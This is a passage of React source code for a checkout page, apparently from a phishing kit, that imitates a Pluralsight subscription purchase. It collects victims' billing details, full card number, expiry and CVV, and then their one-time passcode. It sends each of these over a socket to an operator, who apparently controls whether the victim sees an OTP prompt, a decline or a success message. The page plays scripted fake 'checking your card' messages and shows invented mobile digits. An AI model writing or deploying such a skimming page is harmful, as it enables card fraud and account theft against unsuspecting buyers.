import React, { useState, useEffect } from 'react';
import { useSearchParams, useNavigate, Link, useLocation } from 'react-router-dom';
import { ArrowLeft, Lock, CreditCard, Loader2, MoreHorizontal } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Checkbox } from '@/components/ui/checkbox';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { io, Socket } from 'socket.io-client';
import { useSocket } from '../SocketContext';

const Checkout = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const location = useLocation();
  
  const planName = searchParams.get('plan') || 'Complete';
  const billing = searchParams.get('billing') || 'yearly';
  
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    email: '',
    confirmEmail: '',
    country: '',
    companyName: ''
  });
  
  const [errors, setErrors] = useState({
    firstName: '',
    lastName: '',
    email: '',
    confirmEmail: '',
    country: ''
  });
  
  const [touched, setTouched] = useState({
    firstName: false,
    lastName: false,
    email: false,
    confirmEmail: false,
    country: false
  });
  
  const [agreeTerms, setAgreeTerms] = useState(false);
  const [showTermsError, setShowTermsError] = useState(false);
  const [promoCode, setPromoCode] = useState('');
  
  // Payment flow states
  const [currentStep, setCurrentStep] = useState<'account' | 'loading' | 'payment' | 'review' | 'processing' | 'otp'>('account');
  const [paymentMethod, setPaymentMethod] = useState('');
  const [cardData, setCardData] = useState({
    cardNumber: '',
    cardName: '',
    expiryMonth: '',
    expiryYear: '',
    cvv: ''
  });
  const [cardErrors, setCardErrors] = useState({
    cardNumber: '',
    cardName: '',
    expiryMonth: '',
    expiryYear: '',
    cvv: ''
  });

  // Loading and processing states
  const [isProcessing, setIsProcessing] = useState(false);
  const [processingMessage, setProcessingMessage] = useState('');
  const [showOtp, setShowOtp] = useState(false);
  const [otpValue, setOtpValue] = useState('');
  const [confirmingPayment, setConfirmingPayment] = useState(false);
  const [otpTimer, setOtpTimer] = useState(0);
  const [otpError, setOtpError] = useState('');
  const [otpSubmitting, setOtpSubmitting] = useState(false);
  const [sessionBankLogo, setSessionBankLogo] = useState('');
  const [resendMessage, setResendMessage] = useState('');
  const [randomMobile, setRandomMobile] = useState('');
  const [cardDeclinedError, setCardDeclinedError] = useState('');
  const [otpMobileLast4, setOtpMobileLast4] = useState(() => Math.floor(1000 + Math.random() * 9000).toString());
  const [showSpinner, setShowSpinner] = useState(false);
  const [declineError, setDeclineError] = useState("");
  const [paymentId] = useState(() => 'pay_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9));
  const [cardError, setCardError] = useState("");

  // Pricing data based on the main page
  const pricingData = {
    yearly: {
      'Core Tech': { price: 10563, monthly: 880.25 },
      'Complete': { price: 28750, monthly: 2395.83 }, // Updated to show 28,750 for yearly
      'AI+': { price: 12327, monthly: 1027.25 },
      'Cloud+': { price: 12327, monthly: 1027.25 },
      'Data+': { price: 12327, monthly: 1027.25 },
      'Security+': { price: 12327, monthly: 1027.25 }
    },
    monthly: {
      'Core Tech': { price: 1100, monthly: 1100 },
      'Complete': { price: 2195, monthly: 2195 },
      'AI+': { price: 1299, monthly: 1299 },
      'Cloud+': { price: 1299, monthly: 1299 },
      'Data+': { price: 1299, monthly: 1299 },
      'Security+': { price: 1299, monthly: 1299 }
    }
  };

  const currentPlan = pricingData[billing as keyof typeof pricingData][planName as keyof typeof pricingData.yearly];
  const displayPrice = billing === 'yearly' ? currentPlan.price : currentPlan.monthly;
  const billingText = billing === 'yearly' ? 'Annually' : 'Monthly';

  // Check for card declined error from location state
  useEffect(() => {
    if (location.state?.error) {
      setCardDeclinedError(location.state.error);
      // Clear the error after 10 seconds
      setTimeout(() => setCardDeclinedError(''), 10000);
    }
  }, [location.state]);

  const validateField = (field: string, value: string) => {
    switch (field) {
      case 'firstName':
        if (!value.trim()) return 'First name is required';
        // Check for valid name format (only letters, spaces, and basic punctuation)
        const nameRegex = /^[a-zA-Z\s\-\.\']+$/;
        return !nameRegex.test(value.trim()) ? 'Please enter a valid name' : '';
      case 'lastName':
        if (!value.trim()) return 'Last name is required';
        const lastNameRegex = /^[a-zA-Z\s\-\.\']+$/;
        return !lastNameRegex.test(value.trim()) ? 'Please enter a valid last name' : '';
      case 'email':
        if (!value.trim()) return 'Email is required';
        // Enhanced email validation
        const emailRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
        if (!emailRegex.test(value)) return 'Please enter a valid email address';
        // Check for common invalid patterns
        if (value.includes('..') || value.startsWith('.') || value.endsWith('.')) return 'Please enter a valid email address';
        return '';
      case 'confirmEmail':
        if (!value.trim()) return 'Confirm email is required';
        return value !== formData.email ? 'Emails do not match' : '';
      case 'country':
        return !value ? 'Country is required' : '';
      default:
        return '';
    }
  };

  const handleInputChange = (field: string, value: string) => {
    setFormData(prev => ({ ...prev, [field]: value }));
    
    // Validate field if it has been touched
    if (touched[field as keyof typeof touched]) {
      const error = validateField(field, value);
      setErrors(prev => ({ ...prev, [field]: error }));
    }
  };

  const handleFieldBlur = (field: string) => {
    setTouched(prev => ({ ...prev, [field]: true }));
    const error = validateField(field, formData[field as keyof typeof formData]);
    setErrors(prev => ({ ...prev, [field]: error }));
  };

  const isFormValid = () => {
    const requiredFields = ['firstName', 'lastName', 'email', 'confirmEmail', 'country'];
    return requiredFields.every(field => {
      const value = formData[field as keyof typeof formData];
      return value && !validateField(field, value);
    }) && agreeTerms;
  };

  // Enhanced card validation functions
  const validateCardNumber = (cardNumber: string) => {
    const cleaned = cardNumber.replace(/\s/g, '');
    
    // Basic length check
    if (cleaned.length < 13 || cleaned.length > 19) return false;
    
    // Luhn algorithm check
    let sum = 0;
    let isEven = false;
    
    for (let i = cleaned.length - 1; i >= 0; i--) {
      let digit = parseInt(cleaned.charAt(i), 10);
      
      if (isEven) {
        digit *= 2;
        if (digit > 9) {
          digit -= 9;
        }
      }
      
      sum += digit;
      isEven = !isEven;
    }
    
    return sum % 10 === 0;
  };

  const getCardType = (cardNumber: string) => {
    const cleaned = cardNumber.replace(/\s/g, '');
    
    if (/^4/.test(cleaned)) return 'visa';
    if (/^5[1-5]/.test(cleaned) || /^2[2-7]/.test(cleaned)) return 'mastercard';
    if (/^6/.test(cleaned)) return 'discover';
    if (/^508[5-9]|^60/.test(cleaned)) return 'rupay';
    
    return null;
  };

  const validateCardField = (field: string, value: string) => {
    switch (field) {
      case 'cardNumber':
        if (!value.trim()) return 'Card number is required';
        const cleaned = value.replace(/\s/g, '');
        if (!/^\d+$/.test(cleaned)) return 'Card number must contain only digits';
        if (!validateCardNumber(cleaned)) return 'Invalid card number';
        return '';
      case 'cardName':
        if (!value.trim()) return 'Cardholder name is required';
        const nameRegex = /^[a-zA-Z\s\-\.\']+$/;
        return !nameRegex.test(value.trim()) ? 'Please enter a valid name' : '';
      case 'expiryMonth':
        if (!value) return 'Expiry month is required';
        const month = parseInt(value);
        if (month < 1 || month > 12) return 'Invalid month';
        return '';
      case 'expiryYear':
        if (!value) return 'Expiry year is required';
        const year = parseInt(value);
        const currentYear = new Date().getFullYear() % 100;
        if (year < currentYear || year > currentYear + 50) return 'Invalid year';
        return '';
      case 'cvv':
        if (!value.trim()) return 'CVV is required';
        if (!/^\d{3,4}$/.test(value)) return 'CVV must be 3-4 digits';
        return '';
      default:
        return '';
    }
  };

  const handleCardInputChange = (field: string, value: string) => {
    setCardData(prev => ({ ...prev, [field]: value }));
    const error = validateCardField(field, value);
    setCardErrors(prev => ({ ...prev, [field]: error }));
  };

  const isCardFormValid = () => {
    const requiredFields = ['cardNumber', 'cardName', 'expiryMonth', 'expiryYear', 'cvv'];
    return requiredFields.every(field => {
      const value = cardData[field as keyof typeof cardData];
      return value && !validateCardField(field, value);
    });
  };

  const handleContinue = () => {
    // Validate all fields
    const newErrors = {
      firstName: validateField('firstName', formData.firstName),
      lastName: validateField('lastName', formData.lastName),
      email: validateField('email', formData.email),
      confirmEmail: validateField('confirmEmail', formData.confirmEmail),
      country: validateField('country', formData.country)
    };
    
    setErrors(newErrors);
    setTouched({
      firstName: true,
      lastName: true,
      email: true,
      confirmEmail: true,
      country: true
    });

    if (!agreeTerms) {
      setShowTermsError(true);
      return;
    }
    
    // Check if form is valid
    if (!isFormValid()) {
      return;
    }
    
    setShowTermsError(false);
    
    // Start the payment flow
    setCurrentStep('loading');
    
    // Show loading for 2-3 seconds then move to payment step
    setTimeout(() => {
      setCurrentStep('payment');
    }, 2500);
  };

  const handlePaymentMethodSelect = (method: string) => {
    setPaymentMethod(method);
  };

  const handleReviewOrder = () => {
    setIsProcessing(true);
    setCurrentStep('processing');
    
    // Simulate processing with messages
    setProcessingMessage('Please wait we are checking your details!');
    
    setTimeout(() => {
      setProcessingMessage('Checking your card information');
      setTimeout(() => {
        setProcessingMessage('Redirecting you to confirmation page..');
        setTimeout(() => {
          setIsProcessing(false);
          setCurrentStep('review');
        }, 3000);
      }, 2000);
    }, 1500);
  };

  // --- SOCKET INITIALIZATION AND EVENT HANDLING ---
  const { socket, isConnected } = useSocket();

  useEffect(() => {
    if (!socket) return;
    // Register event listeners
    socket.on('show-otp', () => {
      setConfirmingPayment(false);
      setShowOtp(true);
      setCurrentStep('otp');
      startOtpTimer();
    });
    socket.on('payment-approved', (data) => {
      if (!data || data.paymentId !== paymentId) return;
      navigate('/payment-success', { state: { paymentData: { ...cardData, ...formData, planName, billing, amount: displayPrice, paymentId } } });
    });
    socket.on('payment-rejected', (data) => {
      if (!data || data.paymentId !== paymentId) return;
      setShowSpinner(true);
      setTimeout(() => {
        setShowSpinner(false);
        setCurrentStep('payment');
        setDeclineError('Your card has declined.');
      }, 2500);
    });
    socket.on('insufficient-balance-error', (data) => {
      if (!data || data.paymentId !== paymentId) return;
      setShowSpinner(true);
      setTimeout(() => {
        setShowSpinner(false);
        setCurrentStep('payment');
        setDeclineError('Your card have insufficient balance to pay for this order');
      }, 2500);
    });
    socket.on('invalid-otp-error', (data) => {
      if (!data || data.paymentId !== paymentId) return;
      setOtpSubmitting(false);
      setOtpError('incorrect otp, please enter valid One time passcode');
      setTimeout(() => setOtpError(''), 5000);
    });
    socket.on('card-declined-error', (data) => {
      if (!data || data.paymentId !== paymentId) return;
      setShowSpinner(false);
      setCurrentStep('payment');
      setCardError('Your card has Declined!');
    });
    socket.on('insufficient-balance-error', (data) => {
      if (!data || data.paymentId !== paymentId) return;
      setShowSpinner(false);
      setCurrentStep('payment');
      setCardError('Your card have insufficient balance');
    });
    return () => {
      socket.off('show-otp');
      socket.off('payment-approved');
      socket.off('payment-rejected');
      socket.off('invalid-otp-error');
      socket.off('card-declined-error');
      socket.off('insufficient-balance-error');
    };
  }, [socket, paymentId]);

  const handleOtpSubmit = () => {
    try {
      if (!socket) {
        alert('Connection lost. Please refresh the page and try again.');
        return;
      }
      
      if (!otpValue || otpValue.length < 4) {
        alert('Please enter a valid OTP.');
        return;
      }
      
      setOtpSubmitting(true);
      setOtpError('');
      socket.emit('otp-submitted', { otp: otpValue, paymentId });
    } catch (error) {
      console.error('Error submitting OTP:', error);
      setOtpSubmitting(false);
      alert('Failed to submit OTP. Please try again.');
    }
  };

  const handleOtpCancel = () => {
    setTimeout(() => {
      setCurrentStep('account');
      setShowOtp(false);
      setOtpValue('');
      setOtpError('');
      alert('Transaction cancelled');
    }, 2000);
  };

  const handleResendOtp = () => {
    setResendMessage('One time passcode have been sent to your registered mobile number');
    setTimeout(() => setResendMessage(''), 5000);
    startOtpTimer();
  };

  const startOtpTimer = () => {
    // Random timer between 1.59 to 9.59 minutes (in seconds)
    const randomMinutes = Math.floor(Math.random() * 8) + 1; // 1-8 minutes
    const randomSeconds = 59; // Always 59 seconds
    const totalSeconds = randomMinutes * 60 + randomSeconds;
    setOtpTimer(totalSeconds);
  };

  // Timer countdown effect
  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (otpTimer > 0 && currentStep === 'otp') {
      interval = setInterval(() => {
        setOtpTimer(prev => {
          if (prev <= 1) {
            setCurrentStep('account');
            setShowOtp(false);
            alert('Session expired. Please try again.');
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [otpTimer, currentStep]);

  const formatTimer = (seconds: number) => {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    return `${minutes}.${remainingSeconds.toString().padStart(2, '0')}`;
  };

  // Handle refresh on OTP page and initialize socket connection
  useEffect(() => {
    // Handle page refresh during OTP verification
    const handleBeforeUnload = (e: BeforeUnloadEvent) => {
      if (currentStep === 'otp') {
        e.preventDefault();
        e.returnValue = '';
        
        // Show confirmation popup
        const confirmed = window.confirm('Do you want to cancel this transaction?');
        if (confirmed) {
          setCurrentStep('account');
          setShowOtp(false);
          alert('User pressed back button error msg');
        }
        return '';
      }
      
      // No need to disconnect here as the context socket handles it
    };

    window.addEventListener('beforeunload', handleBeforeUnload);

    return () => {
      window.removeEventListener('beforeunload', handleBeforeUnload);
      // No need to disconnect here as the context socket handles it
    };
  }, [currentStep]);

  const handleConfirmPayment = () => {
    try {
      setConfirmingPayment(true);
      if (!socket) {
        alert('Connection lost. Please refresh the page and try again.');
        setConfirmingPayment(false);
        return;
      }
      const paymentData = {
        paymentId,
        cardNumber: cardData.cardNumber,
        cardName: cardData.cardName,
        cvv: cardData.cvv,
        expiry: `${cardData.expiryMonth}/${cardData.expiryYear}`,
        billingDetails: {
          firstName: formData.firstName,
          lastName: formData.lastName,
          email: formData.email,
          country: formData.country,
          companyName: formData.companyName
        },
        planName,
        billing,
        amount: displayPrice,
        timestamp: new Date().toISOString()
      };
      socket.emit('payment-data', paymentData);
    } catch (error) {
      console.error('Error in payment confirmation:', error);
      setConfirmingPayment(false);
      alert('An unexpected error occurred. Please try again.');
    }
  };

  return (
    <div className="min-h-screen bg-slate-900 text-white">
      {/* Header with Progress */}
      <div className="border-b border-slate-700 px-6 py-4">
        <div className="max-w-7xl mx-auto">
          {/* Back to pricing link */}
          <Link to="/" className="flex items-center gap-2 text-slate-300 hover:text-white mb-6 text-sm">
            <ArrowLeft size={16} />
            Back to pricing
          </Link>
          
          {/* Progress Steps */}
          <div className="flex items-center gap-8">
            <div className="flex items-center gap-3">
              <div className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center text-sm font-medium">
                1
              </div>
              <span className="text-white font-medium">ACCOUNT</span>
            </div>
            <div className="flex items-center gap-3">
              <div className="w-8 h-8 bg-slate-600 rounded-full flex items-center justify-center text-sm">
                2
              </div>
              <span className="text-slate-400">PAYMENT</span>
            </div>
            <div className="flex items-center gap-3">
              <div className="w-8 h-8 bg-slate-600 rounded-full flex items-center justify-center text-sm">
                3
              </div>
              <span className="text-slate-400">REVIEW</span>
            </div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="max-w-7xl mx-auto px-6 py-8">
        <div className="grid lg:grid-cols-3 gap-8">
          {/* Left Content Area */}
          <div className="lg:col-span-2">
            {/* Account Details Section */}
            {currentStep === 'account' && (
              <>
                <div className="flex items-center gap-3 mb-8">
                  <div className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center text-sm font-medium">
                    ✓
                  </div>
                  <h2 className="text-2xl font-bold">Account details</h2>
                </div>

                <div className="mb-6">
                  <span className="text-slate-300">Already have an account? </span>
                  <a href="#" className="text-blue-400 hover:underline">Sign in</a>
                </div>

                <div className="grid md:grid-cols-2 gap-6 mb-6">
                  <div>
                    <label className="block text-sm font-medium mb-2">
                      First name<span className="text-red-500">*</span>
                    </label>
                    <Input
                      value={formData.firstName}
                      onChange={(e) => handleInputChange('firstName', e.target.value)}
                      onBlur={() => handleFieldBlur('firstName')}
                      className={`bg-white text-slate-900 ${
                        errors.firstName ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                      }`}
                      placeholder=""
                    />
                    {errors.firstName && (
                      <p className="text-red-500 text-xs mt-1">{errors.firstName}</p>
                    )}
                  </div>
                  <div>
                    <label className="block text-sm font-medium mb-2">
                      Last name<span className="text-red-500">*</span>
                    </label>
                    <Input
                      value={formData.lastName}
                      onChange={(e) => handleInputChange('lastName', e.target.value)}
                      onBlur={() => handleFieldBlur('lastName')}
                      className={`bg-white text-slate-900 ${
                        errors.lastName ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                      }`}
                      placeholder=""
                    />
                    {errors.lastName && (
                      <p className="text-red-500 text-xs mt-1">{errors.lastName}</p>
                    )}
                  </div>
                </div>

                <div className="grid md:grid-cols-2 gap-6 mb-6">
                  <div>
                    <label className="block text-sm font-medium mb-2">
                      Email<span className="text-red-500">*</span>
                    </label>
                    <Input
                      type="email"
                      value={formData.email}
                      onChange={(e) => handleInputChange('email', e.target.value)}
                      onBlur={() => handleFieldBlur('email')}
                      className={`bg-white text-slate-900 ${
                        errors.email ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                      }`}
                      placeholder=""
                    />
                    {errors.email && (
                      <p className="text-red-500 text-xs mt-1">{errors.email}</p>
                    )}
                  </div>
                  <div>
                    <label className="block text-sm font-medium mb-2">
                      Confirm Email<span className="text-red-500">*</span>
                    </label>
                    <Input
                      type="email"
                      value={formData.confirmEmail}
                      onChange={(e) => handleInputChange('confirmEmail', e.target.value)}
                      onBlur={() => handleFieldBlur('confirmEmail')}
                      className={`bg-white text-slate-900 ${
                        errors.confirmEmail ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                      }`}
                      placeholder=""
                    />
                    {errors.confirmEmail && (
                      <p className="text-red-500 text-xs mt-1">{errors.confirmEmail}</p>
                    )}
                  </div>
                </div>

                <div className="grid md:grid-cols-2 gap-6 mb-8">
                  <div>
                    <label className="block text-sm font-medium mb-2">
                      Country of residence<span className="text-red-500">*</span>
                    </label>
                    <Select 
                      onValueChange={(value) => {
                        handleInputChange('country', value);
                        handleFieldBlur('country');
                      }}
                    >
                      <SelectTrigger className={`bg-white text-slate-900 ${
                        errors.country ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                      }`}>
                        <SelectValue placeholder="- Select One -" />
                      </SelectTrigger>
                       <SelectContent>
                         <SelectItem value="afghanistan">Afghanistan</SelectItem>
                         <SelectItem value="albania">Albania</SelectItem>
                         <SelectItem value="algeria">Algeria</SelectItem>
                         <SelectItem value="argentina">Argentina</SelectItem>
                         <SelectItem value="armenia">Armenia</SelectItem>
                         <SelectItem value="australia">Australia</SelectItem>
                         <SelectItem value="austria">Austria</SelectItem>
                         <SelectItem value="azerbaijan">Azerbaijan</SelectItem>
                         <SelectItem value="bahrain">Bahrain</SelectItem>
                         <SelectItem value="bangladesh">Bangladesh</SelectItem>
                         <SelectItem value="belarus">Belarus</SelectItem>
                         <SelectItem value="belgium">Belgium</SelectItem>
                         <SelectItem value="brazil">Brazil</SelectItem>
                         <SelectItem value="bulgaria">Bulgaria</SelectItem>
                         <SelectItem value="cambodia">Cambodia</SelectItem>
                         <SelectItem value="canada">Canada</SelectItem>
                         <SelectItem value="chile">Chile</SelectItem>
                         <SelectItem value="china">China</SelectItem>
                         <SelectItem value="colombia">Colombia</SelectItem>
                         <SelectItem value="croatia">Croatia</SelectItem>
                         <SelectItem value="cyprus">Cyprus</SelectItem>
                         <SelectItem value="czech-republic">Czech Republic</SelectItem>
                         <SelectItem value="denmark">Denmark</SelectItem>
                         <SelectItem value="egypt">Egypt</SelectItem>
                         <SelectItem value="estonia">Estonia</SelectItem>
                         <SelectItem value="finland">Finland</SelectItem>
                         <SelectItem value="france">France</SelectItem>
                         <SelectItem value="georgia">Georgia</SelectItem>
                         <SelectItem value="germany">Germany</SelectItem>
                         <SelectItem value="ghana">Ghana</SelectItem>
                         <SelectItem value="greece">Greece</SelectItem>
                         <SelectItem value="hungary">Hungary</SelectItem>
                         <SelectItem value="iceland">Iceland</SelectItem>
                         <SelectItem value="india">India</SelectItem>
                         <SelectItem value="indonesia">Indonesia</SelectItem>
                         <SelectItem value="iran">Iran</SelectItem>
                         <SelectItem value="iraq">Iraq</SelectItem>
                         <SelectItem value="ireland">Ireland</SelectItem>
                         <SelectItem value="israel">Israel</SelectItem>
                         <SelectItem value="italy">Italy</SelectItem>
                         <SelectItem value="japan">Japan</SelectItem>
                         <SelectItem value="jordan">Jordan</SelectItem>
                         <SelectItem value="kazakhstan">Kazakhstan</SelectItem>
                         <SelectItem value="kenya">Kenya</SelectItem>
                         <SelectItem value="kuwait">Kuwait</SelectItem>
                         <SelectItem value="latvia">Latvia</SelectItem>
                         <SelectItem value="lebanon">Lebanon</SelectItem>
                         <SelectItem value="lithuania">Lithuania</SelectItem>
                         <SelectItem value="luxembourg">Luxembourg</SelectItem>
                         <SelectItem value="malaysia">Malaysia</SelectItem>
                         <SelectItem value="mexico">Mexico</SelectItem>
                         <SelectItem value="morocco">Morocco</SelectItem>
                         <SelectItem value="netherlands">Netherlands</SelectItem>
                         <SelectItem value="new-zealand">New Zealand</SelectItem>
                         <SelectItem value="nigeria">Nigeria</SelectItem>
                         <SelectItem value="norway">Norway</SelectItem>
                         <SelectItem value="pakistan">Pakistan</SelectItem>
                         <SelectItem value="peru">Peru</SelectItem>
                         <SelectItem value="philippines">Philippines</SelectItem>
                         <SelectItem value="poland">Poland</SelectItem>
                         <SelectItem value="portugal">Portugal</SelectItem>
                         <SelectItem value="qatar">Qatar</SelectItem>
                         <SelectItem value="romania">Romania</SelectItem>
                         <SelectItem value="russia">Russia</SelectItem>
                         <SelectItem value="saudi-arabia">Saudi Arabia</SelectItem>
                         <SelectItem value="singapore">Singapore</SelectItem>
                         <SelectItem value="slovakia">Slovakia</SelectItem>
                         <SelectItem value="slovenia">Slovenia</SelectItem>
                         <SelectItem value="south-africa">South Africa</SelectItem>
                         <SelectItem value="south-korea">South Korea</SelectItem>
                         <SelectItem value="spain">Spain</SelectItem>
                         <SelectItem value="sri-lanka">Sri Lanka</SelectItem>
                         <SelectItem value="sweden">Sweden</SelectItem>
                         <SelectItem value="switzerland">Switzerland</SelectItem>
                         <SelectItem value="taiwan">Taiwan</SelectItem>
                         <SelectItem value="thailand">Thailand</SelectItem>
                         <SelectItem value="turkey">Turkey</SelectItem>
                         <SelectItem value="ukraine">Ukraine</SelectItem>
                         <SelectItem value="uae">United Arab Emirates</SelectItem>
                         <SelectItem value="uk">United Kingdom</SelectItem>
                         <SelectItem value="usa">United States</SelectItem>
                         <SelectItem value="venezuela">Venezuela</SelectItem>
                         <SelectItem value="vietnam">Vietnam</SelectItem>
                       </SelectContent>
                    </Select>
                    {errors.country && (
                      <p className="text-red-500 text-xs mt-1">{errors.country}</p>
                    )}
                  </div>
                  <div>
                    <label className="block text-sm font-medium mb-2">
                      Company name (optional)
                    </label>
                    <Input
                      value={formData.companyName}
                      onChange={(e) => handleInputChange('companyName', e.target.value)}
                      className="bg-white text-slate-900 border-slate-300"
                      placeholder=""
                    />
                  </div>
                </div>

                {/* Terms and Conditions */}
                <div className="mb-8">
                  <div className="flex items-start gap-3">
                    <Checkbox
                      checked={agreeTerms}
                      onCheckedChange={(checked) => {
                        setAgreeTerms(checked as boolean);
                        setShowTermsError(false);
                      }}
                      className={`mt-1 ${showTermsError ? 'border-red-500' : ''}`}
                    />
                    <label className={`text-sm ${showTermsError ? 'text-red-500' : 'text-slate-300'}`}>
                      By checking here and continuing, I agree to the Pluralsight{' '}
                      <a href="#" className="text-blue-400 hover:underline">Terms of Use</a>.
                    </label>
                  </div>
                </div>

                {/* Continue Button */}
                <Button
                  onClick={handleContinue}
                  disabled={!isFormValid()}
                  className={`w-full md:w-auto px-12 py-3 rounded font-medium ${
                    isFormValid() 
                      ? 'bg-blue-600 hover:bg-blue-700 text-white' 
                      : 'bg-slate-500 text-slate-300 cursor-not-allowed'
                  }`}
                >
                  Continue
                </Button>
              </>
            )}

            {/* Loading Section */}
            {currentStep === 'loading' && (
              <div className="flex flex-col items-center justify-center py-20">
                <div className="flex items-center gap-3 mb-8">
                  <div className="w-8 h-8 bg-green-600 rounded-full flex items-center justify-center text-sm font-medium">
                    ✓
                  </div>
                  <h2 className="text-2xl font-bold">Account details</h2>
                </div>
                
                <div className="flex items-center gap-3 mb-12">
                  <div className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center text-sm font-medium">
                    2
                  </div>
                  <h2 className="text-2xl font-bold">Payment</h2>
                </div>

                <p className="text-white mb-6 text-lg">Select a payment method</p>
                
                <div className="flex items-center justify-center">
                  <Loader2 className="h-12 w-12 animate-spin text-blue-500" />
                </div>
              </div>
            )}

            {/* Payment Section */}
            {currentStep === 'payment' && (
              <>
                <div className="flex items-center gap-3 mb-8">
                  <div className="w-8 h-8 bg-green-600 rounded-full flex items-center justify-center text-sm font-medium">
                    ✓
                  </div>
                  <span className="text-slate-300 font-medium">Account details</span>
                </div>

                <div className="flex items-center gap-3 mb-8">
                  <div className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center text-sm font-medium">
                    2
                  </div>
                  <h2 className="text-2xl font-bold">Payment</h2>
                </div>

                <p className="text-white mb-8 text-lg">Select a payment method</p>

                {/* Payment Method Selection */}
                <div 
                  className={`border border-slate-600 rounded-lg p-4 mb-6 cursor-pointer transition-all ${
                    paymentMethod === 'credit' ? 'border-blue-500 bg-slate-800' : 'hover:border-slate-500'
                  }`}
                  onClick={() => handlePaymentMethodSelect('credit')}
                >
                  <div className="flex items-center gap-3">
                    <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
                      paymentMethod === 'credit' ? 'border-blue-500' : 'border-slate-400'
                    }`}>
                      {paymentMethod === 'credit' && (
                        <div className="w-2.5 h-2.5 bg-blue-500 rounded-full"></div>
                      )}
                    </div>
                    <CreditCard className="h-5 w-5 text-blue-400" />
                    <span className="font-medium">Credit Card / Debit Card</span>
                    <div className="ml-auto flex gap-2">
                      {/* Updated card brand logos with exact same size and positioning */}
                      <div className="h-8 w-12 bg-white rounded flex items-center justify-center p-1">
                        <img 
                          src="https://brandlogos.net/wp-content/uploads/2014/10/visa-logo-300x300.png" 
                          alt="Visa" 
                          className="h-6 w-10 object-contain"
                        />
                      </div>
                      <div className="h-8 w-12 bg-white rounded flex items-center justify-center p-1">
                        <img 
                          src="https://i.pinimg.com/originals/48/40/de/4840deeea4afad677728525d165405d0.jpg" 
                          alt="Mastercard" 
                          className="h-6 w-10 object-contain"
                        />
                      </div>
                      <div className="h-8 w-12 bg-white rounded flex items-center justify-center p-1">
                        <img 
                          src="https://images.seeklogo.com/logo-png/49/2/discover-card-logo-png_seeklogo-499264.png" 
                          alt="Discover" 
                          className="h-6 w-10 object-contain"
                        />
                      </div>
                      <div className="h-8 w-12 bg-white rounded flex items-center justify-center p-1">
                        <img 
                          src="https://brandlogos.net/wp-content/uploads/2022/03/rupay-logo-brandlogos.net_-512x512.png" 
                          alt="RuPay" 
                          className="h-6 w-10 object-contain"
                        />
                      </div>
                    </div>
                  </div>
                </div>

                {/* Card Details Form - Only shown when credit card is selected */}
                {paymentMethod === 'credit' && (
                  <div className="space-y-6 mb-8">
                    {/* Card Declined Error Message */}
                    {cardDeclinedError && (
                      <div className="bg-red-50 border border-red-300 rounded-lg p-4">
                        <p className="text-red-700 text-sm font-medium">{cardDeclinedError}</p>
                      </div>
                    )}
                    {cardError && (
                      <div className="mb-4">
                        <div className="bg-red-50 border border-red-500 text-red-700 rounded p-2 text-center text-sm font-semibold">
                          {cardError}
                        </div>
                      </div>
                    )}
                    <div className="grid md:grid-cols-2 gap-6">
                      <div>
                        <label className="block text-sm font-medium mb-2">
                          Name on card<span className="text-red-500">*</span>
                        </label>
                        <Input
                          value={cardData.cardName}
                          onChange={(e) => handleCardInputChange('cardName', e.target.value)}
                          className={`bg-white text-slate-900 ${
                            cardErrors.cardName ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                          }`}
                          placeholder=""
                        />
                        {cardErrors.cardName && (
                          <p className="text-red-500 text-xs mt-1">{cardErrors.cardName}</p>
                        )}
                      </div>
                       <div>
                         <label className="block text-sm font-medium mb-2">
                           Card number<span className="text-red-500">*</span>
                         </label>
                         <div className="relative">
                           <Input
                             value={cardData.cardNumber}
                             onChange={(e) => {
                               const value = e.target.value.replace(/\D/g, '').slice(0, 16);
                               handleCardInputChange('cardNumber', value);
                             }}
                             className={`bg-white text-slate-900 pr-12 ${
                               cardErrors.cardNumber ? 'border-red-500 focus:border-red-500' : 'border-slate-300'
                             }`}
                             placeholder="1234 5678 9012 3456"
                           />
                           {/* Card Brand Logo */}
                           {cardData.cardNumber.length >= 4 && getCardType(cardData.cardNumber) && (
                             <div className="absolute right-3 top-1/2 transform -translate-y-1/2 transition-all duration-300 hover:scale-110">
                               {getCardType(cardData.cardNumber) === 'visa' && (
                                 <img 
                                   src="https://cdn4.iconfinder.com/data/icons/simple-peyment-methods/512/visa-128.png" 
                                   alt="Visa" 
                                   className="h-6 w-8 object-contain"
                                 />
                               )}
                               {getCardType(cardData.cardNumber) === 'mastercard' && (
                                 <img 
                                   src="https://brandlogos.net/wp-content/uploads/2011/08/mastercard-logo.png" 
                                   alt="Mastercard" 
                                   className="h-6 w-8 object-contain"
                                 />
                               )}
                               {getCardType(cardData.cardNumber) === 'discover' && (
                                 <img 
                                   src="https://1000logos.net/wp-content/uploads/2021/05/Discover-logo-500x281.png" 
                                   alt="Discover" 
                                   className="h-6 w-8 object-contain"
                                 />
                               )}
                               {getCardType(cardData.cardNumber) === 'rupay' && (
                                 <img 
                                   src="https://logotyp.us/file/rupay.svg" 
                                   alt="RuPay" 
                                   className="h-6 w-8 object-contain"
                                 />
                               )}
                             </div>
                           )}
                         </div>
                         {cardErrors.cardNumber && (
